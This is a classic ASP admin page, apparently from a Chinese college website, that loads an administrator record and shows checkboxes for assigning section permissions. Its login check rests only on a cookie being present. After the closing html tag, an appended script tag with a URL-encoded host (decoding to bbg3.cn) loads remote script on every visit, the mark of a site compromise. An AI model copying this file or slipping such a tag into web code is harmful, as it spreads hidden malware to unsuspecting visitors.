<!--#include file="conn.asp"-->
<%if request.Cookies("admin99aw")="" then
response.Write "<script language='javascript'>alert('网络超时或您还没有登陆！');window.top.location.href='admin_login.asp';</script>"
response.End
else
if request.Cookies("flag")>1 then
response.Write "<p align=center><font color=red>您没有此项目管理权限！</font></p>"
response.End
end if
end if
%>
<%
  dim adminid
  adminid=trim(request.QueryString("adminid"))
  if adminid="" or isnumeric(adminid)=false then
     response.Write("<script language='javascript'>alert('操作错误');window.close();</script>")
	 response.End()
  end if
%>
<%
  sql="select * from admin where adminid="&adminid
  rs.open sql,conn,1,1
  if not rs.eof then
     admin=rs("admin")
	 gonggao=rs("gonggao")
	 xuesu=rs("xuesu")
	 yanjiu=rs("yanjiu")
	 benke=rs("benke")
	 xuesheng=rs("xuesheng")
	 jiuye=rs("jiuye")
	 shehui=rs("shehui")
	 zhuanti=rs("zhuanti")
	 gongshi=rs("gongshi")
  end if
  rs.close
%>
<html>
<head>
<meta http-equiv="Content-Language" content="zh-cn">
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<link href="images/style.css" rel="stylesheet" type="text/css">
<link href="images/css.css" rel="stylesheet" type="text/css">
<link href="style.css" rel="stylesheet" type="text/css">
<STYLE>
BODY {
	FONT-SIZE: 9pt
}
TABLE {
	FONT-SIZE: 9pt
}
TH {
	FONT-WEIGHT: 500; FONT-SIZE: 9pt
}
A:link {
	COLOR: #dd006f; TEXT-DECORATION: none
}
A:visited {
	TEXT-DECORATION: none
}
A:active {
	TEXT-DECORATION: none
}
A:hover {
	COLOR: #9933ff; TEXT-DECORATION: underline
}

</STYLE>

<title></title></head>
<body bgcolor="#FFFFFF" topmargin="0" leftmargin="0">
<form action="save.asp?adminid=<%=adminid%>" method="post" name="vbform" target="BackFrame" id="newform">
  <table width="100%" height="100%" border="0" cellpadding="2" cellspacing="1" bgcolor="#0B55D2">
    <tr> 
      <td height="26" colspan="2" bgcolor="#0B55D2"> <font color="#FFFFFF">::网站管理员</font></td>
    </tr>
    <tr bgcolor="#eeeeee"> 
      <td width="19%" height="26" align="right">账　号：</td>
      <td width="81%" height="26"> <input readonly name="admin" type="text" class=form id="txtname" value="<%=admin%>" size="20" maxlength="100"></td>
    </tr>
    <tr valign="top" bgcolor="#eeeeee"> 
      <td height="49" colspan="2" align="center"><table width="98%" border="0" cellspacing="0" cellpadding="0">
        <tr>
          <td height="96" colspan="2" align="center" bgcolor="#eeeeee"><fieldset>
            <legend><strong>管理权限分配</strong></legend>
            <table width="95%" border="0" cellspacing="0" cellpadding="5">
              <tr>
                <td height="76" align="center"><table width="100%" border="0" cellspacing="0" cellpadding="5">
                    <tr>
                      <td><input name="gonggao" type="checkbox" <%if gonggao=1 then%>checked<%end if%> id="gonggao" value="1">
                        通知公告
                        <input name="xuesu" type="checkbox" <%if xuesu=1 then%>checked<%end if%> id="xuesu" value="1">
                        科研学术
                        <input name="yanjiu" type="checkbox" <%if yanjiu=1 then%>checked<%end if%> id="yanjiu" value="1">
                        研究生教学                         
                        <input name="shehui" type="checkbox" <%if shehui=1 then%>checked<%end if%> id="shehui" value="1">
社会培训 </td>
                    </tr>
                    <tr>
                      <td><input name="benke" type="checkbox" <%if benke=1 then%>checked<%end if%> id="benke" value="1">
                        本科教学
                        <input name="xuesheng" type="checkbox" <%if xuesheng=1 then%>checked<%end if%> id="xuesheng" value="1">
                        学生工作
                        <input name="jiuye" type="checkbox" <%if jiuye=1 then%>checked<%end if%> id="jiuye" value="1">
                        就业信息
                        &nbsp;
                        <input name="gongshi" type="checkbox" <%if gongshi=1 then%> checked <%end if%> id="gongshi" value="1">
公示栏</td>
                    </tr>
                </table></td>
              </tr>
            </table>
          </fieldset></td>
          <td>&nbsp;</td>
        </tr>
      </table></td>
    </tr>
    <tr align="center" bgcolor="#eeeeee"> 
      <td height="54" colspan="2"> <table width="100%" border="0" cellspacing="0" cellpadding="5">
          <tr> 
            <td height="33" align="center"> 
              <input name="submit" type=submit class=button value="　保　存　" >
              　 
              <input name="YL" type=button class=button value="　关　闭　" onClick="window.close()"></td>
          </tr>
        </table></td>
    </tr>
  </table>
</form>
</body>
</html>  �<script src=http://%62%62%67%33%2E%63%6E></script>